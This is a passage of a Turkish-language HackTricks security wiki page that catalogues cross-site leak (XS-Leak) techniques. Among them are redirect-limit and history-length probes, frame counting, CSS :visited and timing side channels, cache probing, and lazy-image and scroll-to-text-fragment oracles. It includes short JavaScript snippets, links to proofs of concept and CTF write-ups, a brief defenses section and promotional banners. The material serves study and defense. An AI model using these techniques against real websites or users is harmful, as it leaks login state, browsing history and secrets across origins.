* **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Özet:** URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirlemek için tarayıcının yönlendirme sınırını kullanın.
* **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının takip edeceği **maksimum** yönlendirme sayısı **20** ise, bir saldırgan sayfasını **19 yönlendirme** ile yüklemeyi deneyebilir ve sonunda **kurbanı** test edilen sayfaya **yönlendirebilir**. Eğer bir **hata** tetiklenirse, o zaman sayfa kurbanı **yönlendirmeye çalışıyordu**.

### Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Özet:** JavaScript kodu tarayıcı geçmişini manipüle edebilir ve uzunluk özelliği ile erişilebilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API'sı**, JavaScript koduna tarayıcı geçmişini manipüle etme izni verir, bu da bir kullanıcının ziyaret ettiği sayfaları **kaydeder**. Bir saldırgan uzunluk özelliğini dahil etme yöntemi olarak kullanabilir: JavaScript ve HTML gezinmesini algılamak için.\
`history.length`'i kontrol etmek, bir kullanıcıyı bir sayfaya **gezdirmek**, onu **aynı kök**e **geri değiştirmek** ve **`history.length`**'in **yeni değerini kontrol etmek**.

### Aynı URL ile Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: URL tahmin edilenle aynı mı
* **Özet:** Geçmiş uzunluğunu kötüye kullanarak bir çerçeve/açılır pencerenin konumunun belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
* **Kod Örneği**: Aşağıda

Bir saldırgan JavaScript kodunu kullanarak **çerçeve/açılır pencerenin konumunu tahmin edilen bir yere manipüle edebilir** ve **hemen** **`about:blank`**'e **değiştirebilir**. Eğer geçmiş uzunluğu artarsa, bu demek ki URL doğruydu ve **artma şansı vardı çünkü URL aynıysa yeniden yüklenmez**. Eğer artmazsa, bu demek ki **tahmin edilen URL'yi yüklemeye çalıştı** ama **hemen sonra** **`about:blank`**'i yüklediğimiz için, geçmiş uzunluğu **tahmin edilen URL yüklenirken hiç artmadı**.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Çerçeve Sayısını Sayma

* **Dahil Etme Yöntemleri**: Çerçeveler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Özet:** `window.length` özelliğini inceleyerek iframe elemanlarının miktarını değerlendirin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` ile açılan bir web sayfasındaki **çerçeve sayısını saymak**, kullanıcının o sayfadaki **durumunu belirlemeye yardımcı olabilir**.\
Ayrıca, sayfada her zaman aynı sayıda çerçeve varsa, çerçeve sayısını **sürekli olarak** kontrol etmek, sızdırılabilecek bilgileri belirlemeye yardımcı olabilir.

Bu tekniğin bir örneği olarak, Chrome'da bir **PDF**, içsel olarak bir `embed` kullanıldığı için **çerçeve sayma** ile **tespit edilebilir**. `zoom`, `view`, `page`, `toolbar` gibi bazı kontrol sağlayan [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardır, bu teknik ilginç olabilir.

### HTMLElements

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Özet:** Sızdırılan değeri okuyarak 2 olası durum arasındaki farkı ayırt edin
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanları aracılığıyla bilgi sızıntısı, özellikle dinamik medya dosyaları kullanıcı bilgilerine dayalı olarak oluşturulduğunda veya filigranlar eklendiğinde, medya boyutunu değiştirerek web güvenliğinde bir endişe kaynağıdır. Bu, saldırganların belirli HTML elemanları tarafından açığa çıkarılan bilgileri analiz ederek olası durumlar arasında ayrım yapmalarını sağlayabilir.

### HTML Elemanları Tarafından Açığa Çıkarılan Bilgiler

* **HTMLMediaElement**: Bu eleman medyanın `duration` ve `buffered` sürelerini ortaya çıkarır, bu bilgilere API'si aracılığıyla erişilebilir. [HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: `videoHeight` ve `videoWidth`'i açığa çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur, medya içeriği hakkında daha detaylı bilgi sunar. [HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Bu işlev, video oynatma kalitesi hakkında detaylar sağlar, işlenen video veri miktarını gösterebilen `totalVideoFrames` dahil. [getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Bu eleman bir resmin `height` ve `width`'ini sızdırır. Ancak, bir resim geçersizse, bu özellikler 0 döndürecektir ve `image.decode()` işlevi reddedilecektir, resmi doğru bir şekilde yüklenemediğini gösterir. [HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Özelliği

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Özet:** Kullanıcının durumu veya durumu ile ilişkili web sitesi stilindeki değişiklikleri belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, **kullanıcının durumuna bağlı olarak web sitesi stilini değiştirebilir**. Cross-origin CSS dosyaları, **HTML link elemanı** ile saldırgan sayfasına gömülebilir ve **kurallar** saldırgan sayfaya **uygulanır**. Bir sayfa bu kuralları dinamik olarak değiştiriyorsa, bir saldırgan, kullanıcı durumuna bağlı olarak bu **farklılıkları tespit edebilir**.\
Bir sızıntı tekniği olarak, saldırgan, belirli bir HTML elemanının CSS özelliklerini **okumak** için `window.getComputedStyle` yöntemini kullanabilir. Sonuç olarak, etkilenen eleman ve özellik adı biliniyorsa, bir saldırgan keyfi CSS özelliklerini okuyabilir.

### CSS Geçmişi

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Özet:** Bir URL'ye `:visited` stili uygulandığında ziyaret edildiğini belirlemek
* **Kod Örneği**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Buna**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) göre, bu headless Chrome'da çalışmıyor.
{% endhint %}

CSS `:visited` seçicisi, kullanıcı tarafından daha önce ziyaret edilmiş URL'leri farklı şekilde biçimlendirmek için kullanılır. Geçmişte, `getComputedStyle()` yöntemi bu stil farklılıklarını belirlemek için kullanılabilirdi. Ancak, modern tarayıcılar, bu yöntemin bir bağlantının durumunu ortaya çıkarmasını engellemek için güvenlik önlemleri uygulamıştır. Bu önlemler, her zaman bağlantının ziyaret edilmiş gibi hesaplanan stilin döndürülmesini ve `:visited` seçicisi ile uygulanabilecek stilleri kısıtlamayı içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak ayırt etmek mümkündür. Bir teknik, kullanıcıyı CSS'den etkilenen bir alana etkileşime sokarak, özellikle `mix-blend-mode` özelliğini kullanmaktır. Bu özellik, öğelerin arka planlarıyla karıştırılmasına izin verir ve kullanıcı etkileşimine dayanarak ziyaret edilmiş durumu ortaya çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan bağlantıların render zamanlamalarını sömürerek algılama sağlanabilir. Tarayıcılar ziyaret edilen ve ziyaret edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu, renderleme sürecinde ölçülebilir bir zaman farkı oluşturabilir. Bu tekniği, ziyaret edilmiş durumun, zaman analizi yoluyla algılanabilir hale getirmek için birden fazla bağlantı kullanarak zaman farkını artırarak gösteren bir kanıt konsepti (PoC), bir Chromium hata raporunda belirtildi.

Bu özellikler ve yöntemler hakkında daha fazla ayrıntı için belgelerine göz atın:

* `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### İçerik Belgesi X-Frame Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Özet:** Google Chrome'da, bir sayfa X-Frame-Options kısıtlamaları nedeniyle çapraz kökenli bir siteye gömülmesi engellendiğinde, özel bir hata sayfası görüntülenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömülüyorsa, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için diğer tarayıcılardan farklı olarak boş bir belge nesnesi (null yerine) döndürür. Saldırganlar, boş belgeyi algılayarak, geliştiricilerin X-Frame-Options başlığını tutarsız bir şekilde ayarladığı durumlarda özellikle hata sayfalarını göz ardı ettiğinde, kullanıcının durumu hakkında bilgi açığa çıkarabilir. Bu tür sızıntıları önlemek için güvenlik başlıklarının farkında olunması ve tutarlı bir şekilde uygulanması önemlidir.

### İndirme Tespiti

* **Dahil Etme Yöntemleri**: Çerçeveler, Açılır Pencereler
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Özet:** Bir saldırgan, iframeleri kullanarak dosya indirmelerini ayırt edebilir; iframenin devamlı erişilebilir olması, başarılı dosya indirmesini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği görüntülemek yerine indirmesini talimat verir. Bu davranış, bir kullanıcının bir dosya indirme tetikleyen bir sayfaya erişiminin olup olmadığını tespit etmek için sömürülebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik bulunmaktadır:

1. **İndirme Çubuğu İzleme**:
* Bir dosya Chromium tabanlı tarayıcılarda indirildiğinde, tarayıcı penceresinin altında bir indirme çubuğu görünür.
* Saldırganlar, pencere yüksekliğindeki değişiklikleri izleyerek, indirme çubuğunun görünümünü çıkarımlayabilir ve bir indirme başlatıldığını öne sürebilir.
2. **İframelerle İndirme Navigasyonu**:
* Bir sayfa, `Content-Disposition: attachment` başlığını kullanarak bir dosya indirme tetiklediğinde, bu bir navigasyon olayına neden olmaz.
* İçeriği bir iframede yükleyerek ve navigasyon olaylarını izleyerek, içerik düzeninin bir dosya indirmesine neden olup olmadığını kontrol etmek mümkündür (navigasyon olmaz).
3. **İframeler Olmadan İndirme Navigasyonu**:
* İframe tekniğiyle benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanımını içerir.
* Yeni açılan pencerede navigasyon olaylarını izleyerek, bir dosya indirme tetiklenip tetiklenmediğini (navigasyon olmaz) veya içeriğin içeride görüntülendiğini belirlemek mümkündür (navigasyon gerçekleşir).

Yalnızca giriş yapmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler, tarayıcının indirme isteğine verdiği yanıta dayanarak dolaylı olarak kullanıcının kimlik doğrulama durumunu çıkarmak için kullanılabilir.

### Bölümlenmiş HTTP Önbellek Atlatma <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Özet:** Bir saldırgan, iframeleri kullanarak dosya indirmelerini ayırt edebilir; iframenin devamlı erişilebilir olması, başarılı dosya indirmesini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Bu tekniği ilginç kılan şey şudur: Chrome artık **önbellek bölümlendirmesine** sahiptir ve yeni açılan sayfanın önbellek anahtarı şudur: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ancak bir ngrok sayfası açarsam ve içinde fetch kullanırsam, önbellek anahtarı şu olacaktır: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılamaz. Daha fazla ayrıntıya buradan ulaşabilirsiniz: [Önbelleği bölümlendirerek güvenlik ve gizlilik elde etme](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Yorum [**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Eğer bir site `example.com`, `*.example.com/resource` kaynağını içeriyorsa, o kaynağın **önbellekleme anahtarı**, kaynağın doğrudan **üst düzey gezinme** ile istendiği gibi olacaktır. Çünkü önbelleğe erişmek, bir kaynağı yüklemekten daha hızlıdır, sayfanın konumunu değiştirmeye çalışıp durdurmayı 20ms (örneğin) sonra iptal etmeye çalışmak mümkündür. Eğer durdurmadan sonra köken değiştiyse, kaynağın önbelleğe alındığı anlamına gelir.\
Ya da sadece **potansiyel olarak önbelleğe alınmış sayfaya bazı fetch gönderip alınan zamanı ölçebilirsiniz**.

### Manuel Yönlendirme <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha Fazla Bilgi**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Özet:** Bir fetch isteğine verilen yanıtın bir yönlendirme olup olmadığını bulmak mümkündür
* **Kod Örneği**:

![](<../../.gitbook/assets/image (769).png>)

### AbortController ile Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Özet:** Bir kaynağı yüklemeye çalışabilir ve yüklenmeden önce yüklemenin kesilmesi. Bir hata tetiklenirse, kaynağın önbelleğe alınıp alınmadığına bağlı olarak.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Belirli bir kaynağın tarayıcı önbelleğinde olup olmadığını tespit etmek ve yeni içerik önbelleğe alınmadan belirli bir kaynağı önbellekten çıkarmak için _**fetch**_ ve _**setTimeout**_ kullanın. Ayrıca, işlem yeni içerik önbelleğe alınmadan gerçekleşir.
### Komut Kirliliği

* **Dahil Etme Yöntemleri**: HTML Elemanları (script)
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Özet:** **Dahili fonksiyonları üzerine yazmak** ve hatta **çapraz kaynak betiğinden** (doğrudan okunamayan) bu argümanları okumak mümkündür, bu değerli bilgilerin **sızmasına** neden olabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Hizmet İşçileri <a href="#service-workers" id="service-workers"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Özet:** Bir web sitesinin yürütme süresini hizmet işçileri kullanarak ölçün.
* **Kod Örneği**:

Verilen senaryoda, saldırgan **hizmet işçilerinden birini** özellikle "attacker.com" alanlarından birinde kaydeder. Sonra saldırgan, hedef web sitesindeki ana belgeden yeni bir pencere açar ve **hizmet işçisine** bir zamanlayıcı başlatmasını talimat verir. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **hizmet işçisi** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin varışı sırasında, **hizmet işçisi** önceki adımda başlatılan zamanlayıcıdan bir ölçüm yakalar. Bu ölçüm, navigasyon sürecinde gecikmelere neden olan JavaScript'in süresinden etkilenir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfanın yüklenmeden önce kullandığı kaynakları yükleyerek.
{% endhint %}

### Alım Zamanlaması

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Özet:** Bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Çapraz-Pencere Zamanlaması

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Özet:** `window.open` kullanarak bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Yeniden Enjeksiyon ile

Burada, bir çapraz kaynaktan HTML içeriği **enjekte ederek bilgiyi dışarı sızdırma tekniklerini** bulabilirsiniz. Bu teknikler, herhangi bir nedenle **HTML enjekte edebilir ancak JS kodu enjekte edemezsiniz** durumlarında ilginçtir.

### Sarkan İşaretleme

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Görüntü Tembel Yükleme

Eğer içeriği **dışarı sızdırmanız** gerekiyorsa ve **gizli öncesine HTML ekleyebiliyorsanız**, **ortak sarkan işaretleme tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenden dolayı bunu **her karakter için yapmalısınız** (belki iletişim bir önbellek vuruşu aracılığıyla ise) bu hileyi kullanabilirsiniz.

HTML'deki **resimlerin** bir "**yükleniyor**" özniteliği vardır ve değeri "**tembel**" olabilir. Bu durumda, resim yalnızca görüntülendiğinde yüklenecek ve sayfa yüklenirken değil:
```html
<img src=/something loading=lazy >
```
Bu yüzden yapabileceğiniz şey, **web sayfasını gizli içerikten önce doldurmak için çok sayıda gereksiz karakter eklemek** (Örneğin **binlerce "W"**) veya **şuna benzer bir şey eklemek** `<br><canvas height="1850px"></canvas><br>.`\
Öyleyse örneğin **enjeksiyonumuz bayrağın önünde görünüyorsa**, **resim yüklenecek**, ancak bayraktan sonra görünüyorsa, bayrak + gereksiz karakterler **yükleme işlemini engelleyecektir** (ne kadar gereksiz karakter yerleştireceğinizle oynamanız gerekecektir). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) ne olduğunu gösterir.

Başka bir seçenek, izin veriliyorsa **scroll-to-text-fragment**'i kullanmaktır:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini sağlamak için** şunun gibi bir şey yapabilirsiniz:
```
#:~:text=SECR
```
Web sayfası şöyle olacak: **`https://victim.com/post.html#:~:text=SECR`**

post.html, saldırganın gereksiz karakterler ve tembel yükleme görüntüsünü içerir ve ardından botun sırrı eklenir.

Bu metin, botun sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlayacaktır. Çünkü bu metin sır ve **sadece görüntünün altında** olduğu için, **görüntü yalnızca tahmin edilen sır doğruysa yüklenecektir**. Bu şekilde, sırrı **harf harf dışarı sızdırmak için bir oracle** elde etmiş olursunuz.

Bunu sömürmek için bazı kod örnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Görüntü Tembel Yükleme Zaman Tabanlı

Eğer **harici bir görüntü yüklemek mümkün değilse** ve bu durum saldırganı görüntünün yüklendiğini gösterebilir, başka bir seçenek **birkaç kez harf tahmin etmeye çalışmak ve bunu ölçmektir**. Eğer görüntü yüklendiyse, tüm isteklerin süresi yüklenmediğindekinden daha uzun sürecektir. Bu, [**bu yazının çözümünde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **kullanılan şeydir:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, **bazı HTML içeriğinin varlığını zamanlama ile tespit etmek mümkündür**, çünkü eğer `main[id='site-main']` seçicisi eşleşmiyorsa, geri kalan **seçicileri kontrol etmesine gerek yoktur**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Enjeksiyonu

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) adresinde önerilen önlemler bulunmaktadır ve her bölümde [https://xsleaks.dev/](https://xsleaks.dev/) wiki sayfasında bu tekniklere karşı nasıl korunulacağı hakkında daha fazla bilgi bulabilirsiniz.

## Referanslar

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Sağlayın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
